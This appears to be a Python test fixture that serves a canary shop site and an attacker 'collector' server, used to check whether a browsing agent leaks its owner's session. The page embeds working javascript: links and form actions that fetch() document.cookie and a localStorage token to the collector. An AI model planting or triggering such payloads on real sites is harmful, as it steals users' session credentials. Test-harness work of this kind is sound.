"""The site the attack bank attacks: alice's account on it, held by the victim's node and no one else's.

Alice's session is a cookie (`sid`, HttpOnly) and a script-readable one (`pref`). The node gets them from its owner's
import (`unbrowse-node session import`), never by visiting: the site sets no session on any page, so another node
that browses it is a stranger. With her session, the front page stores a token in `localStorage` and holds links and
a form whose address would run code in the page's own world, each sending what it reads to the collector (another
host, where an attacker would listen); `/me` shows her private page; `/session.json` says her session back (a site
that echoes its token). Without it, each says no.

A second server, the collector, is the attacker's: anything that reaches it is logged with the rest. Every request to
either is logged (`log`), with the cookies it carried, for the oracle. Standard library only.
"""
import http.server
import json
import secrets
import threading
import time
import urllib.parse


class Canaries:
    """Alice's secrets, made fresh for each run: long and random, so none turns up by chance."""

    def __init__(self, sid, pref, store, private):
        self.sid, self.pref, self.store, self.private = sid, pref, store, private

    @classmethod
    def made(cls):
        draw = lambda tag: f"{tag}{secrets.token_urlsafe(18).replace('-', 'x').replace('_', 'y')}"
        return cls(draw("Sid"), draw("Pref"), draw("Store"), draw("Private"))

    def named(self):
        return {"session cookie": self.sid, "script-readable cookie": self.pref, "stored token": self.store, "private page": self.private}

    def cookies_txt(self, host, secure=False):
        """Alice's cookies as a Netscape cookies.txt for `host`, as the owner would export them."""
        far = int(time.time()) + 86400 * 30
        flag = "TRUE" if secure else "FALSE"
        return (
            "# Netscape HTTP Cookie File\n"
            f"#HttpOnly_{host}\tFALSE\t/\t{flag}\t{far}\tsid\t{self.sid}\n"
            f"{host}\tFALSE\t/\t{flag}\t{far}\tpref\t{self.pref}\n"
        )


def _page(canaries, signed_in, collector):
    if not signed_in:
        return "<!doctype html><title>Canary shop</title><p id=who>a stranger</p><a href=/me>my account</a>"
    send = f"fetch('{collector}/c?d='+btoa(document.cookie+'|'+localStorage.getItem('authState')),{{mode:'no-cors'}})"
    return (
        "<!doctype html><title>Canary shop</title>"
        f"<script>localStorage.setItem('authState', '{canaries.store}');</script>"
        "<p id=who>alice</p><a href=/me>my account</a>"
        f"<a id=js href=\"javascript:{send}\">open the offer</a>"
        f"<form id=f action=\"javascript:{send}\"><input id=q name=q><button id=go>search</button></form>"
        f"<label id=l for=s>by label</label><form action=/ok><input type=submit id=s formaction=\"javascript:{send}\"></form>"
    )


def serve(host, port, canaries, log, collector="http://localhost:9", name="site"):
    """The canary site (or, with `name="collector"`, the collector) on `host:port`, logging into `log`."""

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *_):
            pass

        def _answer(self, status, body, kind="text/html"):
            data = body.encode()
            self.send_response(status)
            self.send_header("Content-Type", kind)
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(data)

        def _handle(self):
            length = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(length).decode("utf-8", "ignore") if length else ""
            cookie = self.headers.get("Cookie") or ""
            log.append({"t": time.time(), "server": name, "method": self.command, "path": self.path, "cookie": cookie, "body": body})
            if name == "collector":
                return self._answer(204, "")
            jar = dict(p.strip().split("=", 1) for p in cookie.split(";") if "=" in p)
            signed_in = jar.get("sid") == canaries.sid
            path = urllib.parse.urlsplit(self.path).path
            if path == "/":
                return self._answer(200, _page(canaries, signed_in, collector))
            if path == "/me":
                if not signed_in:
                    return self._answer(401, "<!doctype html><title>Sign in</title><p>sign in to see your account</p>")
                return self._answer(200, f"<!doctype html><title>alice</title><p>alice's account</p><p id=secret>{canaries.private}</p>")
            if path == "/login":
                if self.command == "POST":
                    return self._answer(401, "<!doctype html><title>Sign in</title><p id=flash>Your password is invalid</p>")
                return self._answer(200, "<!doctype html><title>Sign in</title><form method=post action=/login>"
                                    "<label for=username>Username</label><input id=username name=username autocomplete=username>"
                                    "<label for=password>Password</label><input id=password name=password type=password autocomplete=current-password>"
                                    "<button type=submit>Sign in</button></form>")
            if path == "/session.json":
                if not signed_in:
                    return self._answer(401, json.dumps({"error": "not signed in"}), "application/json")
                return self._answer(200, json.dumps({"user": "alice", "token": canaries.sid, "items": [{"name": "lamp", "price": 40}]}), "application/json")
            return self._answer(404, "<!doctype html><title>no</title>")

        do_GET = do_POST = _handle

    return http.server.ThreadingHTTPServer((host, port), Handler)


def start(canaries, log, public=None):
    """The canary site and the collector, each on a port of its own on this machine, serving in the background. A
    node's browser never browses this machine, so with `public` (a function from a local address to a public one, the
    bank's tunnel) each is reached at a public https address of its own, two hosts apart: (site address, collector
    address, servers)."""
    collector = serve("127.0.0.1", 0, canaries, log, name="collector")
    collector_url = f"http://127.0.0.1:{collector.server_address[1]}"
    threading.Thread(target=collector.serve_forever, daemon=True).start()
    if public:
        collector_url = public(collector_url)
    site = serve("127.0.0.1", 0, canaries, log, collector=collector_url)
    threading.Thread(target=site.serve_forever, daemon=True).start()
    site_url = f"http://127.0.0.1:{site.server_address[1]}"
    if public:
        site_url = public(site_url)
    return site_url, collector_url, (site, collector)
